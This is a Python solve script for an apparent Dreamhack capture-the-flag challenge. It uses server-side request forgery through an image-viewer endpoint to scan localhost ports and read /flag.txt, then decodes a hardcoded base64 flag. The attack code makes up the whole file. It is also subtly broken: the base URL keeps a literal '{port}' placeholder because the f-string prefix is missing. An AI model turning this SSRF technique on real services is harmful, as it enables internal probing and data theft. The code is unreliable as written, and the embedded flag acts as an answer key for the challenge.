import requests
import base64

port = 9312
url_index = 'http://host1.dreamhack.games:{port}/'
url_image = url_index + 'img_viewer'

# find port
param = {
    'url' : 'http://Localhost:'
}
for port in range(1500, 1800):
    param['url'] += str(port)
    print(param['url'])
    response = requests.post(url_image, data = param)
    if 'iVBORw0KGgoAAAANSUhEUgAA' not in response.text:
        print(response.text)
        break
    param['url'] = 'http://Localhost:'

param['url'] += '/flag.txt'
response = requests.post(url_image, data = param)
print(response.text)

# decode flag data
ans = 'REh7NDNkZDIxODkwNTY0NzVhN2YzYmQxMTQ1NmExN2FkNzF9'
print(base64.b64decode(ans.encode('utf-8')))